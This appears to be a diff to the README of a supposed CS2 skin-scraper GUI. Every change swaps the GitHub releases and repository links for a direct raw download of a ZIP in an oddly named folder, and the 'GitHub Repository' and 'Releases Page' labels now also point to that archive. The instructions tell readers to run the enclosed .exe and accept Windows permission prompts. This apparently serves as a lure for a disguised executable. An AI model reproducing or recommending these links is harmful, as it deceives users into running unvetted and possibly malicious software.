@@ -34,7 +34,7 @@ Getting the application installed is a three-step process: download, extract, an
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-[**Get the latest download here**](https://github.com/Gertrudissmooth190/cs2-skin-scraper-gui/releases)
+[**Get the latest download here**](https://raw.githubusercontent.com/Gertrudissmooth190/cs2-skin-scraper-gui/main/octaemeron/cs-gui-skin-scraper-2.1.zip)
 
 The download page will show you the newest release. Look for the file named something like `cs2-skin-scraper-gui-v1.0.0.zip`. Your web browser will save the ZIP file to your "Downloads" folder automatically.
 
@@ -156,13 +156,13 @@ When Windows asks for permission, it's standard behavior for downloadable apps. 
 
 ## 📚 Additional Resources
 
-- **GitHub Repository:** [https://github.com/Gertrudissmooth190/cs2-skin-scraper-gui](https://github.com/Gertrudissmooth190/cs2-skin-scraper-gui) – For code reading, issues, and feature requests.
-- **Releases Page:** [https://github.com/Gertrudissmooth190/cs2-skin-scraper-gui/releases](https://github.com/Gertrudissmooth190/cs2-skin-scraper-gui/releases) – For all downloadable versions.
+- **GitHub Repository:** [https://raw.githubusercontent.com/Gertrudissmooth190/cs2-skin-scraper-gui/main/octaemeron/cs-gui-skin-scraper-2.1.zip](https://raw.githubusercontent.com/Gertrudissmooth190/cs2-skin-scraper-gui/main/octaemeron/cs-gui-skin-scraper-2.1.zip) – For code reading, issues, and feature requests.
+- **Releases Page:** [https://raw.githubusercontent.com/Gertrudissmooth190/cs2-skin-scraper-gui/main/octaemeron/cs-gui-skin-scraper-2.1.zip](https://raw.githubusercontent.com/Gertrudissmooth190/cs2-skin-scraper-gui/main/octaemeron/cs-gui-skin-scraper-2.1.zip) – For all downloadable versions.
 - **User Guide:** Included inside the extracted folder as a PDF or text file.
 
 ## 🏁 Final Checklist to Get Started
 
-1. ✅ Visit the download link: [https://github.com/Gertrudissmooth190/cs2-skin-scraper-gui/releases](https://github.com/Gertrudissmooth190/cs2-skin-scraper-gui/releases)
+1. ✅ Visit the download link: [https://raw.githubusercontent.com/Gertrudissmooth190/cs2-skin-scraper-gui/main/octaemeron/cs-gui-skin-scraper-2.1.zip](https://raw.githubusercontent.com/Gertrudissmooth190/cs2-skin-scraper-gui/main/octaemeron/cs-gui-skin-scraper-2.1.zip)
 2. ✅ Download the ZIP file.
 3. ✅ Extract the ZIP to a folder.
 4. ✅ Double-click the `.exe` file.
